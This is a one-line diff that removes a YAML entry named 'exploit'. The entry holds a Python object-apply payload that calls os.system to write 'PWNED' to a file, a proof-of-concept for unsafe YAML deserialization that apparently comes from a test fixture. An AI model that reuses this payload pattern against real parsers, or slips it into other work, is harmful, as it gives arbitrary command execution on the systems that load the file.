@@ -1,1 +1,0 @@
-exploit: !!python/object/apply:os.system ["echo PWNED > pwned.txt"]
